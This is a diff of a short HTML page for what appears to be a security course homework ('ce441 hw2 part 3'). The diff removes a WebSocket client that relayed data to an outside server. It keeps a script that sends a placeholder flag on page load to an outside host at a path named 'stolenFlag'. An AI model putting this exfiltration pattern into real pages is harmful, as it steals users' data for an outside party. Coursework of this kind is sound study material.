@@ -4,18 +4,11 @@
         <meta charset="utf-8" />
     </head>
     <body>
-    this is ce441 hw2 part 3
+    this is ce441 hw2 part 3, v2
         <script>
 const wsUrl = "ws://91.107.157.58:8080/ws";
-const websocket = new WebSocket(wsUrl);
-websocket.onopen = () => {
-  websocket.send("flag");
-};
 let flag=`ce441{salam}`;
 fetch(`https://hw2p3.ckodser.ir/stolenFlag/${flag}`);
-websocket.onmessage = (event) => {
-fetch(`https://hw2p3.ckodser.ir/stolenFlagws/${event.data}`);
-};
         </script>
     </body>
 </html>
